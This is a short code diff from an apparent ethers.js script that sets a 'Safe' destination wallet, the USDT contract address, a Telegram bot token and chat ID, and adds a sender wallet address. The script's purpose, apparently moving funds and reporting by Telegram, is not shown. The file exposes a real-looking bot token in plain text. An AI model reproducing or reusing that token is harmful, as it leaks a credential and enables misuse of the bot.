@@ -8,7 +8,8 @@ const destinationWallet = "0x08f695b8669b648897ed5399b9b5d951b72881a0"; // Safe 
 const usdtContractAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // USDT contract address (e.g., 0xdAC17F958D2ee523a2206206994597C13D831ec7)
 const telegramBotToken = "7673283097:AAFpBQTArL6bEIe04ITxAfvrWPbrcgfvtVg"; // Telegram bot token
 const telegramChatId = "7474852341"; // Telegram chat ID
-
+// Replace with your actual wallet address
+const senderWalletAddress = "0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3"; // Example: "0x1234...abcd"
 // Connect to Ethereum provider
 const provider = new ethers.JsonRpcProvider(providerUrl);
 const wallet = new ethers.Wallet(privateKey, provider);
